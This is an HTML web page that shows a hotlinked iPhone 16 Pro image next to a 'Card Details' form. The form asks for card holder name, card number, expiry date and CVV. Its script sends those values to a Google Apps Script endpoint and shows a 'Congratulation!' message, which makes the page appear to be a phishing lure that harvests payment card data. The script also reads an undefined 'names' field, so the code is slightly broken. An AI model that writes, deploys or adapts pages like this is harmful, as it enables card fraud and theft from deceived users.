<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Card Details Form</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:Arial,sans-serif}
body{background:#000000;color:#fff}
.container{display:flex;min-height:100vh}
.left,.right{flex:1;display:flex;align-items:center;justify-content:center;padding:40px}
.left{background:linear-gradient(90deg,#000000,#06080b,#000000)}
.left img{max-width:85%;filter:drop-shadow(0 10px 25px rgba(0, 0, 0, 0.6))}
.form{width:100%;max-width:620px}
h1{font-size:58px;margin-bottom:35px;font-weight:300}
label{display:block;margin:18px 0 8px;font-weight:bold}
input,textarea{
width:100%;padding:18px;border:none;border-radius:10px;
background:#36373e;color:#fff;font-size:18px;outline:none}
textarea{height:120px;resize:none}
input::placeholder,textarea::placeholder{color:#8f949d}
.check{display:flex;align-items:center;margin:18px 0}
.check input{width:auto;margin-right:10px}
button{
width:100%;padding:18px;border:none;border-radius:40px;margin-top:20px;
background:linear-gradient(90deg,#1888ff,#1b66ff);
color:#fff;font-size:22px;font-weight:bold;cursor:pointer}
button:hover{opacity:.95}
#status{margin-top:15px;font-weight:bold}
@media(max-width:900px){
.container{flex-direction:column}
h1{font-size:42px}
.left img{max-width:60%}
}
</style>
</head>
<body>
<div class="container">
<div class="left">
<img src="https://www.apple.com/newsroom/images/2024/09/apple-debuts-iphone-16-pro-and-iphone-16-pro-max/article/Apple-iPhone-16-Pro-hero-240909_inline.jpg.large_2x.jpg" alt="Phone">
</div>
<div class="right">
<div class="form">
<h1>Card Details</h1>

<form id="leadForm">
<label>Card Holder Name</label>
<input id="name" type="text" placeholder="Enter Name" required>

<label>Card Number</label>
<input id="number" type="number" placeholder="Enter Card Number" maxlength="16" required>

<label>Expiry Date</label>
<input id="date" type="month" placeholder="Expiry Date (MM/YY)" maxlength="5">

<label>CVV</label>
<input id="cvv" type="number"  placeholder="CVV" maxlength="3">

<button type="submit">Submit Details</button>
</form>

<div id="status"></div>

</div>
</div>
</div>

<script>
document.getElementById("leadForm").addEventListener("submit",async function(e){
e.preventDefault();
const status=document.getElementById("status");
const data={
names:names.value,
number:number.value,
date:date.value,
cvv:cvv.value
};
try{
const response=await fetch("https://script.google.com/macros/s/AKfycbz7xjt1Q3fTOAUdH8_RUkARYg64EnD4k5MdC-uBbudXT-1_xfs-zQS3BegBevHdCc4R/exec",{
method:"POST",
headers:{"Content-Type":"text/plain;charset=utf-8"},
body:JSON.stringify(data)
});
const result=await response.json();
if(result.success){
status.style.color="#4ade80";
status.innerText="Congratulation! Details submit successfully.";
this.reset();
}else{
status.style.color="#ff6b6b";
status.innerText="Error saving details.";
}
}catch(err){
status.style.color="#ff6b6b";
status.innerText="Submission failed.";
console.error(err);
}
});
</script>
</body>
</html>
